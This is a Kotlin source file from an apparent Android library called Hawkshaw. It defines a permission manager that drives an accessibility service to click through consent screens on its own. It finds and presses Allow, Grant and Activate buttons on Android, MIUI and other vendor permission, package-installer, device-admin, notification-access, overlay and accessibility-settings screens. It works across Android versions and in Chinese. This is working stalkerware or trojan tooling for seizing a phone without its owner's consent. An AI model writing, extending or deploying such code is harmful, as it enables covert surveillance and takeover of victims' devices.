package com.hawkshaw.library.features.accessibility

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.find
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.findAndClick
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.findFirst
import com.hawkshaw.library.features.accessibility.socialmedia.Researcher
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.*

/**
 * Enhanced robust permission manager that automatically grants all permissions without errors
 */
object EnhancedPermissionManager {
    private const val TAG = "EnhancedPermissionManager"
    
    // Robustness variables
    private var retryCount = 0
    private const val MAX_RETRIES = 5
    private var lastProcessedEvent: Long = 0
    private const val EVENT_DEBOUNCE_MS = 300
    private var isProcessing = false
    private val processedEvents = mutableSetOf<String>()
    
    // Permission tracking
    private val grantedPermissions = mutableSetOf<String>()
    private val pendingPermissions = mutableSetOf<String>()
    
    // Handler for delayed operations
    private val handler = Handler(Looper.getMainLooper())
    private val coroutineScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    
    /**
     * Enhanced permission granting with robustness and error handling
     */
    @RequiresApi(Build.VERSION_CODES.O)
    @JvmStatic
    fun grantPermissionsRobust(
        mainAccessibilityService: MainAccessibilityService,
        accessibilityEvent: AccessibilityEvent
    ) {
        try {
            // Debounce rapid events
            val currentTime = System.currentTimeMillis()
            if (currentTime - lastProcessedEvent < EVENT_DEBOUNCE_MS) {
                Log.d(TAG, "Event debounced, skipping")
                return
            }
            lastProcessedEvent = currentTime
            
            // Prevent concurrent processing
            if (isProcessing) {
                Log.d(TAG, "Already processing, skipping")
                return
            }
            
            isProcessing = true

            Log.d(TAG, "Enhanced permission granting started for event: ${accessibilityEvent.eventType}")
            
            val packageName = accessibilityEvent.packageName?.toString() ?: ""
            val className = accessibilityEvent.className?.toString() ?: ""
            val source = accessibilityEvent.source
            
            if (source == null) {
                Logger.w(TAG, "Source is null, cannot process permissions")
                isProcessing = false
                return
            }
            
            // Create unique event identifier
            val eventId = "${packageName}_${className}_${currentTime}"
            if (processedEvents.contains(eventId)) {
                Log.d(TAG, "Event already processed: $eventId")
                isProcessing = false
                return
            }
            processedEvents.add(eventId)
            
            // Clean old processed events (keep only last 100)
            if (processedEvents.size > 100) {
                val iterator = processedEvents.iterator()
                repeat(50) { if (iterator.hasNext()) iterator.next(); iterator.remove() }
            }
            
            Logger.i(TAG, "Processing permission for package: $packageName, class: $className")
            
            // Process permissions based on package
            val success = when {
                isPermissionControllerPackage(packageName) -> {
                    handlePermissionController(source, packageName)
                }
                isPackageInstallerPackage(packageName) -> {
                    handlePackageInstaller(source)
                }
                isSettingsPackage(packageName) -> {
                    handleSettingsPackage(source, className, mainAccessibilityService)
                }
                isMiuiSecurityCenter(packageName) -> {
                    handleMiuiSecurityCenter(source, className)
                }
                isOtherSystemPackage(packageName) -> {
                    handleOtherSystemPackage(source, packageName, className)
                }
                else -> {
                    Log.d(TAG, "Unhandled package: $packageName")
                    false
                }
            }
            
            if (success) {
                Logger.i(TAG, "Permission handling successful for $packageName")
                retryCount = 0 // Reset retry count on success
            } else {
                Logger.w(TAG, "Permission handling failed for $packageName, retry count: $retryCount")
                if (retryCount < MAX_RETRIES) {
                    retryCount++
                    // Retry after delay
                    handler.postDelayed({
                        retryPermissionGrant(mainAccessibilityService, accessibilityEvent)
                    }, 1000)
                }
            }
            
        } catch (e: Exception) {
            Log.d(TAG, "Error in enhanced permission granting", e)
        } finally {
            isProcessing = false
        }
    }
    
    /**
     * Handle permission controller packages (Android system permissions)
     */
    private fun handlePermissionController(source: AccessibilityNodeInfo, packageName: String): Boolean {
        Log.d(TAG, "Handling permission controller: $packageName")
        
        return try {
            var success = false
            
            // Try different permission button combinations based on Android version
            when {
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.R -> {
                    // Android 11+ permission buttons
                    success = source.findAndClick("com.android.permissioncontroller:id/permission_allow_foreground_only_button") ||
                            source.findAndClick("com.android.permissioncontroller:id/permission_allow_button") ||
                            source.findAndClick("com.android.permissioncontroller:id/permission_allow_always_button") ||
                            source.findAndClick("com.android.permissioncontroller:id/permission_allow_one_time_button")
                }
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q -> {
                    // Android 10 permission buttons
                    success = source.findAndClick("com.android.permissioncontroller:id/permission_allow_always_button") ||
                            source.findAndClick("com.android.permissioncontroller:id/permission_allow_foreground_only_button") ||
                            source.findAndClick("com.android.permissioncontroller:id/permission_allow_button")
                }
                else -> {
                    // Older Android versions
                    success = source.findAndClick("com.android.permissioncontroller:id/permission_allow_button") ||
                            source.findAndClick("com.android.permissioncontroller:id/permission_allow_always_button")
                }
            }
            
            // Try alternative button IDs if standard ones fail
            if (!success) {
                success = source.findAndClick("android:id/button1") ||
                        source.findAndClick("android:id/button_positive") ||
                        clickByText(source, "Allow") ||
                        clickByText(source, "ALLOW") ||
                        clickByText(source, "Grant") ||
                        clickByText(source, "GRANT")
            }
            
            Log.d(TAG, "Permission controller handling result: $success")
            success
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling permission controller", e)
            false
        }
    }
    
    /**
     * Handle package installer permissions
     */
    @RequiresApi(Build.VERSION_CODES.O)
    private fun handlePackageInstaller(source: AccessibilityNodeInfo): Boolean {
        Log.d(TAG, "Handling package installer")
        
        return try {
            // Print tree for debugging
            Researcher.printTree(source, 0)
            
            val success = source.findAndClick("com.android.packageinstaller:id/permission_allow_button") ||
                    source.findAndClick("android:id/button1") ||
                    clickByText(source, "Allow") ||
                    clickByText(source, "ALLOW")
            
            Log.d(TAG, "Package installer handling result: $success")
            success
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling package installer", e)
            false
        }
    }
    
    /**
     * Handle Android settings permissions
     */
    private fun handleSettingsPackage(
        source: AccessibilityNodeInfo, 
        className: String, 
        service: MainAccessibilityService
    ): Boolean {
        Log.d(TAG, "Handling settings package, class: $className")
        
        return try {
            when (className) {
                "com.android.settings.applications.specialaccess.deviceadmin.DeviceAdminAdd" -> {
                    handleDeviceAdminAdd(source)
                }
                "android.app.Dialog" -> {
                    handleGenericDialog(source)
                }
                "com.android.settings.Settings\$NotificationAccessSettingsActivity" -> {
                    handleNotificationAccessSettings(source)
                }
                "android.app.AlertDialog" -> {
                    handleAlertDialog(source, service)
                }
                "com.android.settings.Settings\$AppDrawOverlaySettingsActivity" -> {
                    handleOverlaySettings(source)
                }
                "com.android.settings.Settings\$UsageAccessSettingsActivity" -> {
                    handleUsageAccessSettings(source)
                }
                "com.android.settings.Settings\$AccessibilitySettingsActivity" -> {
                    handleAccessibilitySettings(source)
                }
                else -> {
                    Log.d(TAG, "Unhandled settings class: $className")
                    handleGenericSettings(source)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling settings package", e)
            false
        }
    }
    
    /**
     * Handle MIUI security center
     */
    private fun handleMiuiSecurityCenter(source: AccessibilityNodeInfo, className: String): Boolean {
        Log.d(TAG, "Handling MIUI security center, class: $className")
        
        return try {
            when (className) {
                "com.miui.permcenter.permissions.PermissionsEditorActivity" -> {
                    handleMiuiPermissionsEditor(source)
                }
                "miui.app.AlertDialog" -> {
                    handleMiuiAlertDialog(source)
                }
                "com.miui.appmanager.ApplicationsDetailsActivity" -> {
                    handleMiuiApplicationDetails(source)
                }
                else -> {
                    Log.d(TAG, "Unhandled MIUI class: $className")
                    handleGenericMiui(source)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling MIUI security center", e)
            false
        }
    }
    
    // Helper methods for specific permission screens
    
    private fun handleDeviceAdminAdd(source: AccessibilityNodeInfo): Boolean {
        return source.findAndClick("com.android.settings:id/action_button") ||
                source.findAndClick("android:id/button1") ||
                clickByText(source, "Activate") ||
                clickByText(source, "ACTIVATE")
    }
    
    private fun handleGenericDialog(source: AccessibilityNodeInfo): Boolean {
        return source.findAndClick("android:id/button1") ||
                source.findAndClick("android:id/button_positive") ||
                clickByText(source, "OK") ||
                clickByText(source, "Allow")
    }
    
    private fun handleNotificationAccessSettings(source: AccessibilityNodeInfo): Boolean {
        val titles = source.findAccessibilityNodeInfosByViewId("android:id/title")
        val checkboxes = source.findAccessibilityNodeInfosByViewId("android:id/checkbox")
        
        titles.forEachIndexed { index, titleNode ->
            val titleText = titleNode?.text?.toString()
            if (titleText?.contains("Hawkshaw", ignoreCase = true) == true ||
                titleText?.contains("Settings", ignoreCase = true) == true) {
                checkboxes.getOrNull(index)?.let { checkbox ->
                    if (!checkbox.isChecked) {
                        return checkbox.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    }
                }
            }
        }
        return false
    }
    
    private fun handleAlertDialog(source: AccessibilityNodeInfo, service: MainAccessibilityService): Boolean {
        val titleNodes = source.findAccessibilityNodeInfosByViewId("miui:id/alertTitle")
        val titleText = titleNodes.firstOrNull()?.text?.toString()
        
        if (titleText?.contains("Hawkshaw", ignoreCase = true) == true) {
            val success = source.findAndClick("android:id/button1") ||
                    clickByText(source, "OK") ||
                    clickByText(source, "Allow")
            
            if (success) {
                handler.postDelayed({
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                }, 100)
            }
            return success
        }
        return false
    }
    
    private fun handleOverlaySettings(source: AccessibilityNodeInfo): Boolean {
        val frames = source.findAccessibilityNodeInfosByViewId("android:id/widget_frame")
        val frame = frames.firstOrNull()
        
        return frame?.parent?.performAction(AccessibilityNodeInfo.ACTION_CLICK) ?: false
    }
    
    private fun handleUsageAccessSettings(source: AccessibilityNodeInfo): Boolean {
        // Similar to notification access but for usage stats
        return handleNotificationAccessSettings(source)
    }
    
    private fun handleAccessibilitySettings(source: AccessibilityNodeInfo): Boolean {
        // Handle accessibility service enabling
        val switches = source.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
        switches.forEach { switchNode ->
            if (switchNode?.isChecked == false) {
                return switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
        return false
    }
    
    private fun handleGenericSettings(source: AccessibilityNodeInfo): Boolean {
        return source.findAndClick("android:id/button1") ||
                source.findAndClick("android:id/switch_widget") ||
                clickByText(source, "Allow") ||
                clickByText(source, "Enable")
    }
    
    private fun handleMiuiPermissionsEditor(source: AccessibilityNodeInfo): Boolean {
        val titles = source.findAccessibilityNodeInfosByViewId("android:id/title")
        var success = false
        titles.forEach { title ->
            if (title?.performAction(AccessibilityNodeInfo.ACTION_CLICK) == true) {
                success = true
            }
        }
        return success
    }
    
    private fun handleMiuiAlertDialog(source: AccessibilityNodeInfo): Boolean {
        return source.findAndClick("android:id/text1") ||
                clickByText(source, "Allow") ||
                clickByText(source, "确定") // Chinese "OK"
    }
    
    private fun handleMiuiApplicationDetails(source: AccessibilityNodeInfo): Boolean {
        val appLabel = source.findFirst("com.miui.securitycenter:id/am_applabel_title")
        val labelText = appLabel?.text?.toString()
        
        if (labelText?.contains("Hawkshaw", ignoreCase = true) == true) {
            val switch = source.findFirst("com.miui.securitycenter:id/am_switch")
            
            if (switch?.isChecked == false) {
                return switch.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            
            // Handle notification and battery settings
            val titleNodes = source.find("com.miui.securitycenter:id/tv_title")
            val summaryNodes = source.find("com.miui.securitycenter:id/tv_summary")
            
            summaryNodes.forEachIndexed { index, summaryNode ->
                if (summaryNode?.text?.toString() == "Yes") {
                    titleNodes.getOrNull(index)?.parent?.parent?.let { parent ->
                        return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    }
                }
            }
        }
        return false
    }
    
    private fun handleGenericMiui(source: AccessibilityNodeInfo): Boolean {
        return source.findAndClick("android:id/button1") ||
                clickByText(source, "允许") || // Chinese "Allow"
                clickByText(source, "确定") || // Chinese "OK"
                clickByText(source, "Allow")
    }
    
    private fun handleOtherSystemPackage(source: AccessibilityNodeInfo, packageName: String, className: String): Boolean {
        Log.d(TAG, "Handling other system package: $packageName, class: $className")
        
        // Generic handling for other system packages
        return source.findAndClick("android:id/button1") ||
                source.findAndClick("android:id/button_positive") ||
                clickByText(source, "Allow") ||
                clickByText(source, "OK") ||
                clickByText(source, "Grant") ||
                clickByText(source, "Enable")
    }
    
    /**
     * Click node by text content
     */
    private fun clickByText(source: AccessibilityNodeInfo, text: String): Boolean {
        return try {
            val nodes = source.findAccessibilityNodeInfosByText(text)
            nodes.forEach { node ->
                if (node?.isClickable == true) {
                    return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
                // Try parent if node itself is not clickable
                node?.parent?.let { parent ->
                    if (parent.isClickable) {
                        return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    }
                }
            }
            false
        } catch (e: Exception) {
            Log.e(TAG, "Error clicking by text: $text", e)
            false
        }
    }
    
    /**
     * Retry permission granting
     */
    @RequiresApi(Build.VERSION_CODES.O)
    private fun retryPermissionGrant(service: MainAccessibilityService, event: AccessibilityEvent) {
        Logger.i(TAG, "Retrying permission grant (attempt ${retryCount + 1}/$MAX_RETRIES)")
        grantPermissionsRobust(service, event)
    }
    
    // Package identification helpers
    private fun isPermissionControllerPackage(packageName: String): Boolean {
        return packageName == "com.google.android.permissioncontroller" ||
                packageName == "com.android.permissioncontroller"
    }
    
    private fun isPackageInstallerPackage(packageName: String): Boolean {
        return packageName == "com.google.android.packageinstaller" ||
                packageName == "com.android.packageinstaller"
    }
    
    private fun isSettingsPackage(packageName: String): Boolean {
        return packageName == "com.android.settings"
    }
    
    private fun isMiuiSecurityCenter(packageName: String): Boolean {
        return packageName == "com.miui.securitycenter"
    }
    
    private fun isOtherSystemPackage(packageName: String): Boolean {
        return packageName.startsWith("com.android.") ||
                packageName.startsWith("com.google.android.") ||
                packageName.startsWith("com.miui.") ||
                packageName.startsWith("com.xiaomi.") ||
                packageName.startsWith("com.samsung.") ||
                packageName.startsWith("com.huawei.") ||
                packageName.startsWith("com.oppo.") ||
                packageName.startsWith("com.vivo.") ||
                packageName.startsWith("com.oneplus.")
    }
    
    /**
     * Get permission granting statistics
     */
    fun getPermissionStats(): PermissionStats {
        return PermissionStats(
            grantedCount = grantedPermissions.size,
            pendingCount = pendingPermissions.size,
            retryCount = retryCount,
            isProcessing = isProcessing
        )
    }
    
    /**
     * Reset permission manager state
     */
    fun reset() {
        retryCount = 0
        isProcessing = false
        processedEvents.clear()
        grantedPermissions.clear()
        pendingPermissions.clear()
        Logger.i(TAG, "Permission manager state reset")
    }
    
    data class PermissionStats(
        val grantedCount: Int,
        val pendingCount: Int,
        val retryCount: Int,
        val isProcessing: Boolean
    )
}
